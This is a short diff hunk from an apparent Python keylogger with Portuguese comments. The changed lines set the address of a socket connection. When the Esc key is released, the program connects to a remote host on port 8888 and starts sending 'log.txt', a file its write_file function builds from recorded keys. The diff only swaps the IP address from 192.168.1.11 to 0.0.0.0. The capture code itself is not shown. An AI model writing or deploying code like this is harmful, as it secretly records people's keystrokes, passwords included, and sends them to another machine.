@@ -105,7 +105,7 @@ def write_file(keys):  # cria log.txt no diretorio desejado ( default = mesma pa
 def on_release(key):  # condição para fechar o programa
     if key == Key.esc:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect(('192.168.1.11', 8888))
+        client.connect(('0.0.0.0', 8888))
 
         namefile = ('log.txt') #nome do arquivo que será enviado
         client.send(namefile.encode()) #codifica o nome do arquivo para ser enviado
